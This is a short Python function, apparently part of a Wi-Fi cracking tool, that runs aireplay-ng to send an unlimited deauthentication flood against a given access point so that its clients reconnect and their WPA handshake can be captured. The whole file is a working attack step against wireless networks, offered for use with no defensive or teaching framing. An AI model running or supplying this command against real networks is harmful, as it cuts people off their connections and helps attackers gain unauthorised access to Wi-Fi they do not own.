from utils import run_command

def deauth_clients(bssid):
    print("Optional Step: Deauthenticating clients to capture handshake faster...")
    run_command(f"sudo aireplay-ng --deauth 0 -a {bssid} wlan0")
